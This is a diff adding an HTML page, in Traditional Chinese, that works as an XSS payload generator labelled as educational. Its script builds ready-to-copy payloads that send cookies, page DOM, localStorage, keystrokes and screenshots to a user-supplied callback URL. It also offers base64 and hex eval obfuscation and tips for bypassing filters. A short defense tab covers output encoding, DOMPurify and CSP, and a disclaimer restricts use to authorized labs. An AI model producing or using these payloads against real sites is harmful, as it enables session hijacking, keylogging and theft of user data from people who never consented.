@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Payload 生成器 - 教育用途</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .warning {
+            background: #ff6b6b;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #c92a2a;
+        }
+
+        .warning h3 {
+            margin-bottom: 8px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        h1 {
+            color: white;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #667eea;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 600;
+        }
+
+        input[type="text"],
+        input[type="url"],
+        textarea,
+        select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e1e8ed;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+
+        input:focus,
+        textarea:focus,
+        select:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        textarea {
+            min-height: 120px;
+            font-family: 'Courier New', monospace;
+            resize: vertical;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .payload-output {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 6px;
+            border-left: 4px solid #667eea;
+            margin-top: 15px;
+            position: relative;
+        }
+
+        .payload-code {
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #333;
+            word-break: break-all;
+            white-space: pre-wrap;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .copy-btn:hover {
+            background: #5568d3;
+        }
+
+        .payload-types {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .payload-type {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 6px;
+            border: 2px solid #e1e8ed;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .payload-type:hover {
+            border-color: #667eea;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+
+        .payload-type.active {
+            border-color: #667eea;
+            background: #e7eaf6;
+        }
+
+        .payload-type h4 {
+            color: #667eea;
+            margin-bottom: 8px;
+        }
+
+        .payload-type p {
+            color: #666;
+            font-size: 13px;
+            margin: 0;
+        }
+
+        .info-box {
+            background: #e7f5ff;
+            border-left: 4px solid #339af0;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+
+        .info-box h4 {
+            color: #1971c2;
+            margin-bottom: 8px;
+        }
+
+        .info-box p {
+            color: #495057;
+            margin: 5px 0;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #e1e8ed;
+        }
+
+        .tab {
+            padding: 10px 20px;
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            position: relative;
+            transition: color 0.3s;
+        }
+
+        .tab.active {
+            color: #667eea;
+        }
+
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #667eea;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 1.8em;
+            }
+
+            .payload-types {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 XSS Payload 生成器</h1>
+
+        <div class="warning">
+            <h3>⚠️ 重要聲明</h3>
+            <p><strong>僅用於教育目的和授權的安全測試！</strong></p>
+            <p>• 只能在你擁有或有明確授權的系統上使用</p>
+            <p>• 未經授權測試他人網站是違法的</p>
+            <p>• 建議在 DVWA、bWAPP 等合法練習環境中使用</p>
+        </div>
+
+        <div class="card">
+            <div class="tabs">
+                <button class="tab active" onclick="switchTab('basic')">基本 Payload</button>
+                <button class="tab" onclick="switchTab('advanced')">進階 Payload</button>
+                <button class="tab" onclick="switchTab('defense')">防禦指南</button>
+            </div>
+
+            <!-- 基本 Payload Tab -->
+            <div id="basic" class="tab-content active">
+                <h2>基本 XSS Payload 生成器</h2>
+
+                <div class="form-group">
+                    <label for="callbackUrl">回調 URL（你的伺服器）:</label>
+                    <input type="url" id="callbackUrl" placeholder="https://your-server.com/callback" value="https://example.com/xss-callback">
+                </div>
+
+                <div class="form-group">
+                    <label for="payloadType">Payload 類型:</label>
+                    <div class="payload-types">
+                        <div class="payload-type active" data-type="basic">
+                            <h4>基本 Alert</h4>
+                            <p>簡單的彈窗測試</p>
+                        </div>
+                        <div class="payload-type" data-type="cookie">
+                            <h4>Cookie 竊取</h4>
+                            <p>取得頁面 Cookie</p>
+                        </div>
+                        <div class="payload-type" data-type="dom">
+                            <h4>DOM 抓取</h4>
+                            <p>取得完整 HTML</p>
+                        </div>
+                        <div class="payload-type" data-type="screenshot">
+                            <h4>螢幕截圖</h4>
+                            <p>使用 Canvas 截圖</p>
+                        </div>
+                        <div class="payload-type" data-type="keylogger">
+                            <h4>鍵盤記錄</h4>
+                            <p>記錄按鍵輸入</p>
+                        </div>
+                        <div class="payload-type" data-type="full">
+                            <h4>完整收集</h4>
+                            <p>收集所有資訊</p>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn" onclick="generatePayload()">🔨 生成 Payload</button>
+
+                <div id="output" style="display: none;">
+                    <h3 style="margin-top: 30px; color: #333;">生成的 Payload:</h3>
+                    <div class="payload-output">
+                        <button class="copy-btn" onclick="copyPayload()">複製</button>
+                        <div class="payload-code" id="payloadCode"></div>
+                    </div>
+
+                    <div class="info-box">
+                        <h4>📝 使用說明</h4>
+                        <p>1. 將此 payload 注入到目標欄位（僅限授權測試環境）</p>
+                        <p>2. 當 XSS 觸發時，資料會發送到你的回調 URL</p>
+                        <p>3. 在你的伺服器端接收並記錄這些資料</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 進階 Payload Tab -->
+            <div id="advanced" class="tab-content">
+                <h2>進階 Payload 選項</h2>
+
+                <div class="form-group">
+                    <label for="customJs">自定義 JavaScript 代碼:</label>
+                    <textarea id="customJs" placeholder="輸入你的自定義 JavaScript 代碼..."></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label for="encoding">編碼方式:</label>
+                    <select id="encoding">
+                        <option value="none">無編碼</option>
+                        <option value="url">URL 編碼</option>
+                        <option value="base64">Base64 編碼</option>
+                        <option value="hex">Hex 編碼</option>
+                    </select>
+                </div>
+
+                <button class="btn" onclick="generateAdvancedPayload()">🔨 生成進階 Payload</button>
+
+                <div id="advancedOutput" style="display: none;">
+                    <h3 style="margin-top: 30px; color: #333;">生成的進階 Payload:</h3>
+                    <div class="payload-output">
+                        <button class="copy-btn" onclick="copyAdvancedPayload()">複製</button>
+                        <div class="payload-code" id="advancedPayloadCode"></div>
+                    </div>
+                </div>
+
+                <div class="info-box" style="margin-top: 20px;">
+                    <h4>🎯 繞過技巧</h4>
+                    <p>• 使用不同的事件處理器: onerror, onload, onfocus</p>
+                    <p>• HTML 實體編碼: &lt;script&gt; → &#60;script&#62;</p>
+                    <p>• JavaScript 偽協議: javascript:alert(1)</p>
+                    <p>• 大小寫混合: &lt;ScRiPt&gt;</p>
+                </div>
+            </div>
+
+            <!-- 防禦指南 Tab -->
+            <div id="defense" class="tab-content">
+                <h2>XSS 防禦指南</h2>
+
+                <div class="info-box">
+                    <h4>🛡️ 輸入驗證</h4>
+                    <p>• 永遠不要信任用戶輸入</p>
+                    <p>• 使用白名單驗證而非黑名單</p>
+                    <p>• 限制輸入長度和格式</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>🔒 輸出編碼</h4>
+                    <p>• HTML 內容: 使用 HTML 實體編碼</p>
+                    <p>• JavaScript: 使用 JavaScript 編碼</p>
+                    <p>• URL: 使用 URL 編碼</p>
+                    <p>• CSS: 使用 CSS 編碼</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>📋 Content Security Policy (CSP)</h4>
+                    <p>• 設定嚴格的 CSP 標頭</p>
+                    <p>• 禁用 inline scripts</p>
+                    <p>• 使用 nonce 或 hash</p>
+                </div>
+
+                <div class="form-group" style="margin-top: 20px;">
+                    <label>安全編碼示例（JavaScript）:</label>
+                    <div class="payload-output">
+                        <div class="payload-code">// 不安全的方式
+element.innerHTML = userInput;
+
+// 安全的方式
+element.textContent = userInput;
+
+// 或使用 DOMPurify
+element.innerHTML = DOMPurify.sanitize(userInput);
+
+// HTML 實體編碼函數
+function escapeHtml(text) {
+    const map = {
+        '&': '&amp;',
+        '<': '&lt;',
+        '>': '&gt;',
+        '"': '&quot;',
+        "'": '&#039;'
+    };
+    return text.replace(/[&<>"']/g, m => map[m]);
+}</div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>CSP 標頭示例:</label>
+                    <div class="payload-output">
+                        <div class="payload-code">Content-Security-Policy: 
+    default-src 'self'; 
+    script-src 'self' 'nonce-{隨機值}'; 
+    object-src 'none'; 
+    base-uri 'self';</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let selectedType = 'basic';
+
+        // Tab 切換
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            
+            event.target.classList.add('active');
+            document.getElementById(tabName).classList.add('active');
+        }
+
+        // Payload 類型選擇
+        document.querySelectorAll('.payload-type').forEach(type => {
+            type.addEventListener('click', function() {
+                document.querySelectorAll('.payload-type').forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+                selectedType = this.dataset.type;
+            });
+        });
+
+        // 生成 Payload
+        function generatePayload() {
+            const callbackUrl = document.getElementById('callbackUrl').value;
+            
+            if (!callbackUrl) {
+                alert('請輸入回調 URL');
+                return;
+            }
+
+            let payload = '';
+
+            switch(selectedType) {
+                case 'basic':
+                    payload = '<script>alert("XSS Test - 此為教育演示")<\/script>';
+                    break;
+                
+                case 'cookie':
+                    payload = '<script>\n' +
+                        '(function() {\n' +
+                        '    var img = new Image();\n' +
+                        '    img.src = "' + callbackUrl + '?cookie=" + encodeURIComponent(document.cookie);\n' +
+                        '})();\n' +
+                        '<\/script>';
+                    break;
+                
+                case 'dom':
+                    payload = '<script>\n' +
+                        '(function() {\n' +
+                        '    fetch("' + callbackUrl + '", {\n' +
+                        '        method: "POST",\n' +
+                        '        headers: {"Content-Type": "application/json"},\n' +
+                        '        body: JSON.stringify({\n' +
+                        '            url: window.location.href,\n' +
+                        '            dom: document.documentElement.outerHTML,\n' +
+                        '            cookie: document.cookie\n' +
+                        '        })\n' +
+                        '    });\n' +
+                        '})();\n' +
+                        '<\/script>';
+                    break;
+                
+                case 'screenshot':
+                    payload = '<script>\n' +
+                        '(function() {\n' +
+                        '    var canvas = document.createElement("canvas");\n' +
+                        '    canvas.width = window.innerWidth;\n' +
+                        '    canvas.height = window.innerHeight;\n' +
+                        '    var ctx = canvas.getContext("2d");\n' +
+                        '    \n' +
+                        '    // 注意：實際的截圖需要 html2canvas 或類似庫\n' +
+                        '    ctx.fillStyle = "#fff";\n' +
+                        '    ctx.fillRect(0, 0, canvas.width, canvas.height);\n' +
+                        '    \n' +
+                        '    canvas.toBlob(function(blob) {\n' +
+                        '        var formData = new FormData();\n' +
+                        '        formData.append("screenshot", blob);\n' +
+                        '        fetch("' + callbackUrl + '", {method: "POST", body: formData});\n' +
+                        '    });\n' +
+                        '})();\n' +
+                        '<\/script>';
+                    break;
+                
+                case 'keylogger':
+                    payload = '<script>\n' +
+                        '(function() {\n' +
+                        '    var keys = [];\n' +
+                        '    document.addEventListener("keypress", function(e) {\n' +
+                        '        keys.push(e.key);\n' +
+                        '        if (keys.length > 10) {\n' +
+                        '            fetch("' + callbackUrl + '", {\n' +
+                        '                method: "POST",\n' +
+                        '                body: JSON.stringify({keys: keys})\n' +
+                        '            });\n' +
+                        '            keys = [];\n' +
+                        '        }\n' +
+                        '    });\n' +
+                        '})();\n' +
+                        '<\/script>';
+                    break;
+                
+                case 'full':
+                    payload = '<script>\n' +
+                        '(function() {\n' +
+                        '    var data = {\n' +
+                        '        url: window.location.href,\n' +
+                        '        cookie: document.cookie,\n' +
+                        '        localStorage: JSON.stringify(localStorage),\n' +
+                        '        dom: document.documentElement.outerHTML,\n' +
+                        '        referrer: document.referrer,\n' +
+                        '        userAgent: navigator.userAgent,\n' +
+                        '        timestamp: new Date().toISOString()\n' +
+                        '    };\n' +
+                        '    \n' +
+                        '    fetch("' + callbackUrl + '", {\n' +
+                        '        method: "POST",\n' +
+                        '        headers: {"Content-Type": "application/json"},\n' +
+                        '        body: JSON.stringify(data)\n' +
+                        '    });\n' +
+                        '})();\n' +
+                        '<\/script>';
+                    break;
+            }
+
+            document.getElementById('payloadCode').textContent = payload;
+            document.getElementById('output').style.display = 'block';
+        }
+
+        // 生成進階 Payload
+        function generateAdvancedPayload() {
+            const customJs = document.getElementById('customJs').value;
+            const encoding = document.getElementById('encoding').value;
+            
+            if (!customJs) {
+                alert('請輸入自定義 JavaScript 代碼');
+                return;
+            }
+
+            let payload = '<script>' + customJs + '<\/script>';
+
+            // 應用編碼
+            switch(encoding) {
+                case 'url':
+                    payload = encodeURIComponent(payload);
+                    break;
+                case 'base64':
+                    try {
+                        var encoded = btoa(customJs);
+                        payload = '<script>eval(atob("' + encoded + '"))<\/script>';
+                    } catch(e) {
+                        alert('Base64 編碼失敗: ' + e.message);
+                        return;
+                    }
+                    break;
+                case 'hex':
+                    var hexStr = Array.from(customJs)
+                        .map(function(c) { 
+                            return '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0');
+                        })
+                        .join('');
+                    payload = '<script>eval("' + hexStr + '")<\/script>';
+                    break;
+            }
+
+            document.getElementById('advancedPayloadCode').textContent = payload;
+            document.getElementById('advancedOutput').style.display = 'block';
+        }
+
+        // 複製 Payload
+        function copyPayload() {
+            const text = document.getElementById('payloadCode').textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Payload 已複製到剪貼簿！');
+            });
+        }
+
+        function copyAdvancedPayload() {
+            const text = document.getElementById('advancedPayloadCode').textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                alert('進階 Payload 已複製到剪貼簿！');
+            });
+        }
+    </script>
+</body>
+</html>
